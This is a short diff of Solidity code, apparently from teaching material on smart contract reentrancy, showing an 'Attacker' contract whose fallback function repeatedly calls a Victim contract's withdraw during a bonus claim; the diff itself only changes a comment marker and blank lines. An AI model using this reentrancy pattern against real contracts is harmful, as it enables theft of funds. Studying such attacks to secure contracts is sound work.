@@ -16,16 +16,20 @@ contract Victim {
 }
 
 contract Attacker {
-  ...
+  //...
   function Attacker() {
     victim = Victim(vic_addr);
   }
+  
   function attack() {
     victim.getBonus(_owner);
   }
+  
   function() payable {
     if (count++ < 10) {
       victim.withdraw(2 ether);
     }
   }
 }
+
+
